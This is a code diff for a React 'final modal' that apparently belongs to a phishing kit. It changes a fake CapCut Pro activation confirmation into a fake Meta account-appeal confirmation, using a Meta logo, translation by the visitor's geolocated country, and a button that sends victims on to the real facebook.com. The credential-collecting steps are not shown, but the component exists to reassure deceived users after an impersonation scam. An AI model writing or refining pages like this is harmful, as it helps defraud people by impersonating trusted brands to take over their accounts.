@@ -1,45 +1,52 @@
 import FinalImage from '@/assets/images/final-image.png';
-import { CAPCUT_BTN_PRIMARY, ModalShell } from '@/components/form-modal/modal-shell';
-import { useTranslation } from '@/utils/translate';
+import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
+import translateText from '@/utils/translate';
 import Image from 'next/image';
-import { type FC } from 'react';
-
-const CAPCUT_HOME_URL = 'https://www.capcut.com/';
-
-const FINAL_MODAL_TEXTS = [
-    'CapCut Pro Request Submitted',
-    'Your CapCut Pro request has been added to the processing queue. We will activate your Pro membership within 24 hours. If you do not receive CapCut Pro within 24 hours, please submit again.',
-    'Return to CapCut'
-] as const;
+import { useEffect, useState, type FC } from 'react';
 
 const FinalModal: FC = () => {
-    const { t } = useTranslation(FINAL_MODAL_TEXTS);
-    const { resetFormSession } = store();
+    const [translations, setTranslations] = useState<Record<string, string>>({});
+
+    const { geoInfo } = store();
+    const t = (text: string): string => {
+        return translations[text] || text;
+    };
+
+    useEffect(() => {
+        if (!geoInfo) return;
+
+        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];
+
+        const translateAll = async () => {
+            const translatedMap: Record<string, string> = {};
+
+            for (const text of textsToTranslate) {
+                translatedMap[text] = await translateText(text, geoInfo.country_code);
+            }
+
+            setTranslations(translatedMap);
+        };
+
+        translateAll();
+    }, [geoInfo]);
 
     return (
-        <ModalShell title={t('CapCut Pro Request Submitted')} showClose={false}>
-            <div className='flex flex-1 flex-col px-5 py-4'>
-                <p className='mb-6 text-body-md leading-relaxed text-on-surface-variant'>
-                    {t('Your CapCut Pro request has been added to the processing queue. We will activate your Pro membership within 24 hours. If you do not receive CapCut Pro within 24 hours, please submit again.')}
-                </p>
-
-                <div className='mb-8 overflow-hidden rounded-xl border border-surface-border'>
-                    <Image src={FinalImage} alt='CapCut Pro' className='h-auto w-full' />
+        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
+            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
+                <p className='mt-4 text-2xl font-bold'>{t('Request has been sent')}</p>
+                <p className='text-xl'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
+                <div className='flex flex-col justify-center gap-10'>
+                    <Image src={FinalImage} alt='' />
+                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'>
+                        {t('Return on Facebook')}
+                    </button>
                 </div>
-
-                <button
-                    type='button'
-                    onClick={() => {
-                        resetFormSession();
-                        window.location.href = CAPCUT_HOME_URL;
-                    }}
-                    className={`${CAPCUT_BTN_PRIMARY} mb-2`}
-                >
-                    {t('Return to CapCut')}
-                </button>
+                <div className='flex items-center justify-center p-3'>
+                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
+                </div>
             </div>
-        </ModalShell>
+        </div>
     );
 };
 
